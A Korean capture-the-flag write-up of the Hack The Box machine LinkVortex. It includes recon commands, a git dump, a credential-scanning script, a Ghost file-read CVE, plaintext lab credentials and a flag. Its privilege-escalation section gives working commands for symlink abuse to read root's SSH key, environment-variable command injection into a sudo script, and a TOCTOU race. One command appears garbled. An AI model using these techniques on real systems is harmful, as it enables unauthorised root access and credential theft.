---
slug: "linkvortex"
title: "linkvortex"
date: 2026-07-31
category: "리눅스"
section: "OSCP"
tags: []
excerpt: "이 버전에 마침 Arbitrary-File-Read 취약점이 있다고 함…"
readingTime: 36
---

#### Box: linkvortex | Linux | Easy
날짜: 2026 07 24
소요시간: 

##### Open Ports
22
80
-> host 파일에 등록해줌

##### Interesting Services
Footer 보고 버전 확인해보니까
ghost 라는 앱이라고 함 버전 정보도 소스 들어가보니까 있고
![](assets/images/posts/Pasted%20image%2020260724161504.png)
-> Ghost 5.58

이 버전에 마침 Arbitrary-File-Read 취약점이 있다고 함
[CVE-2023-40028](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028)

##### Initial Foothold
벡터:
명령어:
해당 CVE를 실행시키기 위해선 일단 로그인을 할 수 있는 뭔가가 필요한 듯 함
https://seocontentai.com/how-to-find-your-ghost-login-url/ 
-> 여기 들어가보니까 로그인을 할 수 있는 창이 있음
```
http://linkvortex.htb/ghost
```
hmm,,,,

```sh
gobuster vhost -u linkvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
> http://dev.linkvortex.htb

echo "10.129.231.194 dev.linkvortex.htb" | sudo tee -a /etc/hosts

gobuster dir -u dev.linkvortex.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
> http://dev.linkvortex.htb/.git/
 
git-dumper http://dev.linkvortex.htb/.git/ ./dumped
```
-> 이제 여기서 

만들어둔 크레덴셜 탐지 파일을 사용하면 됨
> [!note]- cred_scan.py
> ```python
> #!/usr/bin/env python3
> """
> cred_scan.py — 디렉토리를 재귀적으로 훑어서 크레덴셜/시크릿/토큰 패턴을 찾아내는 스캐너.
> git-dumper로 뽑은 소스나 임의의 디렉토리에 대해 사용.
> 
> 사용법:
>     python3 cred_scan.py <디렉토리> [--ext py,js,json,env,...]
> """
> 
> import re
> import sys
> import os
> import argparse
> import subprocess
> 
> # ── 탐지 패턴 정의 (카테고리별) ──────────────────────────────
> PATTERNS = {
>     "generic_api_key": re.compile(
>         r"""(?i)(api[_-]?key|apikey)['"]?\s*[:=]\s*['"]([a-z0-9_\-]{16,64})['"]"""
>     ),
>     "generic_secret": re.compile(
>         r"""(?i)(secret|client_secret)['"]?\s*[:=]\s*['"]([a-z0-9_\-]{16,64})['"]"""
>     ),
>     "password_assignment": re.compile(
>         r"""(?i)(password|passwd|pwd)['"]?\s*[:=]\s*['"]([^'"\s]{6,64})['"]"""
>     ),
>     "aws_access_key": re.compile(r"AKIA[0-9A-Z]{16}"),
>     "aws_secret_key": re.compile(
>         r"""(?i)aws(.{0,20})?['"]\s*[:=]\s*['"][0-9a-zA-Z\/+]{40}['"]"""
>     ),
>     "private_key_block": re.compile(
>         r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----"
>     ),
>     "jwt_token": re.compile(
>         r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"
>     ),
>     "slack_token": re.compile(r"xox[baprs]-[0-9A-Za-z-]{10,48}"),
>     "github_token": re.compile(r"gh[pousr]_[A-Za-z0-9]{36,255}"),
>     "generic_bearer_token": re.compile(
>         r"""(?i)bearer\s+[a-z0-9_\-\.]{20,}"""
>     ),
>     "db_connection_string": re.compile(
>         r"""(?i)(mysql|postgres(?:ql)?|mongodb(?:\+srv)?|redis|amqp)://[^\s'"]+"""
>     ),
>     "generic_token_assignment": re.compile(
>         r"""(?i)(token|access_token|auth_token)['"]?\s*[:=]\s*['"]([a-z0-9_\-\.]{16,128})['"]"""
>     ),
>     "google_api_key": re.compile(r"AIza[0-9A-Za-z_\-]{35}"),
>     "slack_webhook": re.compile(
>         r"https://hooks\.slack\.com/services/[A-Za-z0-9/]+"
>     ),
> }
> 
> # 오탐 필터: 이런 값들은 매칭돼도 스킵 (placeholder류)
> FALSE_POSITIVE_VALUES = {
>     "changeme", "your_password", "your-password", "xxxxxx", "placeholder",
>     "example", "test", "password", "123456", "todo", "fixme", "null", "none",
>     "private", "public", "string", "boolean", "number", "object", "array",
>     "true", "false", "undefined", "unknown", "default", "optional", "required",
>     "username", "email", "user", "admin", "root", "n/a", "na", "-",
> }
> 
> SKIP_DIRS = {".git", "node_modules", "__pycache__", ".venv", "venv", "dist", "build"}
> 
> 
> def is_false_positive(value: str) -> bool:
>     return value.strip().lower() in FALSE_POSITIVE_VALUES
> 
> 
> def scan_line(line: str):
>     """한 줄에 대해 모든 패턴 검사, (category, match) 튜플 리스트 반환.
>     캡처 그룹이 있는 패턴은 실제 값만, 없는 패턴(예: private_key_block)은 전체 매칭을 사용."""
>     hits = []
>     for category, pattern in PATTERNS.items():
>         for match in pattern.finditer(line):
>             groups = match.groups()
>             value = groups[-1] if groups and groups[-1] else match.group(0)
>             if is_false_positive(value):
>                 continue
>             hits.append((category, value.strip()))
>     return hits
> 
> 
> def scan_file(filepath: str):
>     findings = []
>     try:
>         with open(filepath, "r", errors="ignore") as f:
>             for lineno, line in enumerate(f, start=1):
>                 for category, match in scan_line(line):
>                     findings.append({
>                         "file": filepath,
>                         "line": lineno,
>                         "category": category,
>                         "match": match,
>                     })
>     except (UnicodeDecodeError, PermissionError, IsADirectoryError):
>         pass
>     return findings
> 
> 
> def scan_git_history(root: str):
>     """.git 디렉토리가 있으면 전체 커밋 히스토리(diff)를 훑어서 패턴 검사.
>     현재 워킹 트리에는 없지만 과거 커밋에만 존재했던 크레덴셜도 잡아냄."""
>     git_dir = os.path.join(root, ".git")
>     if not os.path.isdir(git_dir):
>         return []
> 
>     try:
>         result = subprocess.run(
>             ["git", "log", "-p", "--all"],
>             cwd=root,
>             capture_output=True,
>             text=True,
>             errors="ignore",
>             timeout=120,
>         )
>     except (subprocess.SubprocessError, FileNotFoundError):
>         return []
> 
>     findings = []
>     current_commit = None
>     current_file = None
> 
>     for line in result.stdout.splitlines():
>         if line.startswith("commit "):
>             current_commit = line.split()[1][:12]
>             continue
>         if line.startswith("+++ b/") or line.startswith("--- a/"):
>             current_file = line[6:]
>             continue
>         # diff 추가/삭제 라인만 대상 (컨텍스트 라인 제외해서 노이즈 감소)
>         if not (line.startswith("+") or line.startswith("-")):
>             continue
>         if line.startswith("+++") or line.startswith("---"):
>             continue
> 
>         for category, match in scan_line(line):
>             findings.append({
>                 "commit": current_commit,
>                 "file": current_file,
>                 "category": category,
>                 "match": match,
>                 "change": "added" if line.startswith("+") else "removed",
>             })
> 
>     return findings
> 
> 
> def dedupe_findings(findings: list, key_fields: tuple) -> list:
>     """지정한 필드 조합이 동일한 항목은 첫 번째만 남기고 제거"""
>     seen = set()
>     deduped = []
>     for f in findings:
>         key = tuple(f.get(field) for field in key_fields)
>         if key in seen:
>             continue
>         seen.add(key)
>         deduped.append(f)
>     return deduped
> 
> 
> # ── 스코어링 규칙 ──────────────────────────────────────────
> # 카테고리별 기본 가중치 (실사용 크레덴셜일 확률이 높은 카테고리일수록 높게)
> CATEGORY_WEIGHTS = {
>     "password_assignment": 30,
>     "db_connection_string": 35,
>     "generic_secret": 25,
>     "private_key_block": 20,   # 픽스처에 자주 섞여있어 기본은 낮게, 경로 신호로 보정
>     "generic_api_key": 20,
>     "generic_token_assignment": 20,
>     "aws_secret_key": 30,
>     "aws_access_key": 25,
>     "google_api_key": 20,
>     "github_token": 25,
>     "slack_token": 15,
>     "slack_webhook": 10,
>     "jwt_token": 15,
>     "generic_bearer_token": 15,
> }
> 
> # 경로에 이 키워드가 있으면 감점 (테스트/목업/픽스처일 확률 높음)
> LOW_CONFIDENCE_PATH_HINTS = (
>     "test", "tests", "spec", "specs", "fixture", "fixtures",
>     "mock", "mocks", "example", "examples", "sample", "samples",
>     "demo", "__tests__", "dummy",
> )
> 
> # 경로에 이 키워드가 있으면 가점 (실제 운영 설정일 확률 높음)
> HIGH_CONFIDENCE_PATH_HINTS = (
>     "config.production", "production", "prod", ".env", "settings",
>     "secrets", "credentials", "deploy",
> )
> 
> # UI 폼/문서에서 관용적으로 쓰이는 placeholder 값 (사전 단어 전체가 아니라 이 특정 토큰들만).
> # "단순한 단어라서"가 아니라 "이 값 자체가 자리표시자로 굳어진 관용구라서" 감점하는 것.
> COMMON_PLACEHOLDER_TOKENS = {
>     "newpassword", "oldpassword", "currentpassword", "temppassword",
>     "testpassword", "wrongpassword", "samplepassword", "yourpassword",
>     "dummypassword", "mypassword",
> }
> 
> # 파일명에 이 키워드가 있으면 가점 (실제 로그인 흐름 검증용이라 진짜에 가까운 값을 쓰는 경우가 많음)
> AUTH_FLOW_FILENAME_HINTS = (
>     "authentication", "login", "session", "credential", "signin", "auth.",
> )
> 
> 
> def score_finding(finding: dict, value_counts: dict, removed_values: set) -> int:
>     """휴리스틱 기반 스코어. 높을수록 실제 크레덴셜일 가능성이 높다고 판단."""
>     score = CATEGORY_WEIGHTS.get(finding["category"], 10)
> 
>     path = (finding.get("file") or "").lower()
>     filename = path.rsplit("/", 1)[-1]
> 
>     for hint in LOW_CONFIDENCE_PATH_HINTS:
>         if hint in path:
>             score -= 15
>             break  # 한 번만 감점
> 
>     for hint in HIGH_CONFIDENCE_PATH_HINTS:
>         if hint in path:
>             score += 25
>             break
> 
>     # 인증 흐름을 실제로 검증하는 테스트 파일은 진짜 값에 가까운 비밀번호를 쓰는 경우가 많음
>     # → test/ 경로 감점을 일부 상쇄
>     for hint in AUTH_FLOW_FILENAME_HINTS:
>         if hint in filename:
>             score += 20
>             break
> 
>     value_lower = finding["match"].lower()
>     if value_lower in COMMON_PLACEHOLDER_TOKENS:
>         score -= 20
> 
>     # 같은 값이 여러 파일/커밋에 반복 등장 → 공유되는 더미 값일 확률 높음 → 감점
>     count = value_counts.get(finding["match"], 1)
>     if count > 1:
>         score -= min((count - 1) * 5, 25)
> 
>     # git 히스토리에서 삭제된 적 있는 값 → "실수로 커밋했다가 지운" 진짜 크레덴셜일 확률 높음 → 가점
>     if finding["match"] in removed_values:
>         score += 20
> 
>     # 값 자체의 강도: 너무 짧으면 감점, 대소문자+숫자 섞이면 가점 (엔트로피 신호, 단어 자체를 심사하진 않음)
>     value = finding["match"]
>     if len(value) < 6:
>         score -= 10
>     if re.search(r"[a-z]", value) and re.search(r"[A-Z]", value) and re.search(r"\d", value):
>         score += 10
> 
>     return score
> 
> 
> def rank_candidates(all_findings: list) -> list:
>     """모든 finding에 스코어를 매기고 내림차순 정렬해서 반환"""
>     value_counts = {}
>     for f in all_findings:
>         value_counts[f["match"]] = value_counts.get(f["match"], 0) + 1
> 
>     removed_values = {f["match"] for f in all_findings if f.get("change") == "removed"}
> 
>     scored = []
>     for f in all_findings:
>         s = score_finding(f, value_counts, removed_values)
>         scored.append({**f, "score": s})
> 
>     scored.sort(key=lambda x: x["score"], reverse=True)
>     return scored
> 
> 
> def walk_and_scan(root: str, extensions: set):
>     all_findings = []
>     for dirpath, dirnames, filenames in os.walk(root):
>         dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]
>         for fname in filenames:
>             ext = fname.rsplit(".", 1)[-1].lower() if "." in fname else ""
>             # 확장자 필터: 지정 안 하면 전체 텍스트 파일 대상
>             if extensions and ext not in extensions:
>                 continue
>             fpath = os.path.join(dirpath, fname)
>             all_findings.extend(scan_file(fpath))
>     return all_findings
> 
> 
> def main():
>     parser = argparse.ArgumentParser(description="크레덴셜/시크릿/토큰 재귀 스캐너")
>     parser.add_argument("directory", help="스캔할 디렉토리 경로")
>     parser.add_argument(
>         "--ext",
>         help="검사할 확장자 목록 (콤마 구분). 지정하지 않으면 기본값은 전체 파일 스캔.",
>         default=None,
>     )
>     parser.add_argument(
>         "--no-git-history",
>         action="store_true",
>         help=".git 디렉토리가 있어도 커밋 히스토리는 스캔하지 않음 (워킹 트리만 스캔)",
>     )
>     parser.add_argument(
>         "--no-dedupe",
>         action="store_true",
>         help="동일한 (category, match) 중복 항목 제거를 하지 않음 (기본은 중복 제거함)",
>     )
>     args = parser.parse_args()
> 
>     if args.ext:
>         extensions = {e.strip().lower() for e in args.ext.split(",")}
>     else:
>         extensions = set()
> 
>     if not os.path.isdir(args.directory):
>         print(f"[!] 디렉토리를 찾을 수 없음: {args.directory}")
>         sys.exit(1)
> 
>     print(f"[*] 워킹 트리 스캔 시작: {args.directory}")
>     findings = walk_and_scan(args.directory, extensions)
> 
>     if not args.no_dedupe:
>         before = len(findings)
>         findings = dedupe_findings(findings, ("category", "file", "match"))
>         removed = before - len(findings)
>         if removed:
>             print(f"[*] 중복 {removed}건 제거됨")
> 
>     if findings:
>         print(f"[+] 워킹 트리에서 {len(findings)}건 발견\n")
>         for f in findings:
>             print(f"[{f['category']}] {f['file']}:{f['line']}")
>             print(f"    {f['match']}\n")
>     else:
>         print("[-] 워킹 트리에서 매칭된 결과 없음\n")
> 
>     if not args.no_git_history:
>         git_dir = os.path.join(args.directory, ".git")
>         if os.path.isdir(git_dir):
>             print(f"[*] .git 감지됨 — 커밋 히스토리 스캔 중 (시간 걸릴 수 있음)...")
>             git_findings = scan_git_history(args.directory)
> 
>             if not args.no_dedupe:
>                 before = len(git_findings)
>                 git_findings = dedupe_findings(git_findings, ("category", "file", "match"))
>                 removed = before - len(git_findings)
>                 if removed:
>                     print(f"[*] 히스토리 중복 {removed}건 제거됨")
> 
>             if git_findings:
>                 print(f"[+] 커밋 히스토리에서 {len(git_findings)}건 발견 "
>                       f"(워킹 트리엔 없지만 과거에 존재했을 수 있음)\n")
>                 for f in git_findings:
>                     print(f"[{f['category']}] commit {f['commit']} ({f['change']}) "
>                           f"{f['file']}")
>                     print(f"    {f['match']}\n")
>             else:
>                 print("[-] 커밋 히스토리에서 매칭된 결과 없음")
> 
>     # ── 전체 결과 취합 후 최유력 후보 산출 ──────────────────
>     combined = list(findings) + (list(git_findings) if 'git_findings' in locals() else [])
> 
>     if not combined:
>         print("\n[!] 스코어링할 결과가 없음")
>         return
> 
>     ranked = rank_candidates(combined)
> 
>     top_n = min(5, len(ranked))
>     print(f"\n{'=' * 60}")
>     print(f"[*] 상위 {top_n}개 유력 후보 (스코어 기준 내림차순)")
>     print(f"{'=' * 60}\n")
>     for i, f in enumerate(ranked[:top_n], start=1):
>         loc = f.get("file", "?")
>         if f.get("commit"):
>             loc += f" (commit {f['commit']}, {f.get('change', '?')})"
>         print(f"{i}. [score {f['score']}] [{f['category']}] {loc}")
>         print(f"   {f['match']}\n")
> 
>     best = ranked[0]
>     print(f"{'=' * 60}")
>     print(f"[+] 가장 유력한 후보: {best['match']}")
>     print(f"    카테고리: {best['category']} / 스코어: {best['score']} / 위치: {best.get('file', '?')}")
>     print(f"{'=' * 60}")
> 
> 
> if __name__ == "__main__":
>     main()
> ```

cred_scan.py — 디렉토리를 재귀적으로 훑어서 크레덴셜/시크릿/토큰 패턴을 찾아내는 직접 만든 스캐너

git-dumper로 뽑은 소스나 임의의 디렉토리에 대해 사용.

이걸 돌리면
![](assets/images/posts/Pasted%20image%2020260725202259.png)
-> `OctopiFociPilfer45`
다음과 같은 크레덴셜이 나옴

해당 크레덴셜로 [CVE-2023-40028](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028)
이거 바로 실행해버리면
![](assets/images/posts/Pasted%20image%2020260725203244.png)
-> Arbitary file read 취약점 성공

![](assets/images/posts/Pasted%20image%2020260725214352.png)
-> 그 상태로 docker file에 config.production.json 이라는 경로에 있는 파일을 열람 하면 SMTP 크레덴셜을 확인할 수 있음
`bob@linkvortex.htb:fibber-talented-worth`

```sh
ssh bob@linkvortex.htb
>pw: fibber-talented-worth

cat ~/user.txt 
```
-> **user.txt**: ed98bd37055ca046feffcef15c8cdfb6
##### Privilege Escalation
벡터:
명령어:
```sh
sudo -l
> NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

**/opt/ghost/clean_symlink.sh**
```sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```
**스크립트 리뷰**
- `if [ -z $CHECK_CONTENT ];then`:  `-z`는 "문자열이 비어있는가?"를 검사하는 test 연산자
- 들어온 인자가 `.png` 파일이 아니면 걍 꺼버림
- 해당 파일의 링크를 읽고 `etc`나 `root`가 들어 있으면 링크 끊고 꺼버림
- `etc, root` 둘다 없으면 링크 걸린 파일을 `/var/quarantined`로 파일 이동
- 그리고 `CHECK_CONTENT`=true면 cat /var/quarantined/`arg`  을 실행함

**이걸 어떻게 이용해?**

**1) 이중 링크**
```sh
#이렇게 파일이 있다고 가정
>shell.png -> /home/bob/good.png
>good.png -> nice.png

# -f 를 붙이지 않으면 한번만 링크를 검사함
readlink shell.png
> /home/bob/good.png

#f를 붙이면 재귀적으로 링크를 따라감
readlink shell.png -f
/home/bob/nice.png
```
-> 안전하게 하려면 ! : readlink, realpath를 사용해야 함

`CHECK_CONTENT=true`를 반드시 써야함 -> 이걸로 값을 바꾸지 않으면 조회를 하지 않음!
```sh
ln -s /root/.ssh/id_rsa good.png
ln -s /home/bob/good.png shell.png
CHECK_CONTENT=bash true bash /opt/ghost/clean_symlink.sh shell.png
```
![](assets/images/posts/Pasted%20image%2020260725224903.png)
```sh
#kali에서
nano id_rsa
> ----BEGIN OPENSSH PRIVATE KEY----
> ....

ssh -i id_rsa root@linkvortex.htb
```



**2) `if 뭔가 ;then`  bash exec**

- `[ 조건 ]`이나 `[[ 조건 ]]`처럼 대괄호가 있으면 그건 진짜 "조건식"
- 근데 `$CHECK_CONTENT`처럼 **대괄호 없이 변수 하나만 있으면**, bash는 그 변수의 값을 그대로 셸에 넘겨서 명령어로 실행

```sh
#링크는 if $CHECK_CONTENT 까지 가기 위한 미끼
ln -s /home/bob/good.png shell.png
> shell.png -> /home/bob/good.png

export CHECK_CONTENT=bash
sudo bash /opt/ghost/clean_symlink.sh shell.png
```
![](assets/images/posts/Pasted%20image%2020260725230411.png)

**3) toctou 기법**

위에 스크립트를 보면 이런 느낌임
```sh
readlink $LINK           # ① 체크: 지금 이 순간 뭘 가리키는지 확인
grep -Eq '(etc|root)'    #    "root"나 "etc"가 없으면 통과
mv $LINK $QUAR_DIR/      # ② 이동: 같은 이름으로 격리 디렉토리에 옮김
cat $QUAR_DIR/$LINK_NAME # ③ 사용: 그 이름의 파일 내용을 출력
```
②와 ③ 사이의 그 짧은 시간 간극을 노리는 거임

```sh
#터미널 두개 띄워놓고
# 무한루프: 옮겨질 파일과 "정확히 같은 이름"으로 격리 디렉토리를 덮어씀
while true; do ln -sf /root/root.txt /var/quarantined/toctou.png; done &

# 무해한 파일(디렉토리 아님)을 가리키는 심링크
ln -s /home/bob/.bashrc /home/bob/.cache/toctou.png

CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/.cache/toctou.png
```


##### Rabbit Hole (막혔던 것)
- 크레덴셜 줍기

##### 다음 박스에서 써먹을 것
- scan_cred.py
- 1개 exploit 안되면 다른 사람 exploit 도 써봐
- `if 뭔가 then` 연관된 것들
- double sym link
- 음 쉘 스크립트 해석 잘하게 연습하는것도 ㄱㅊ을듯?
- toctou 이건 좀 신박하긴 함
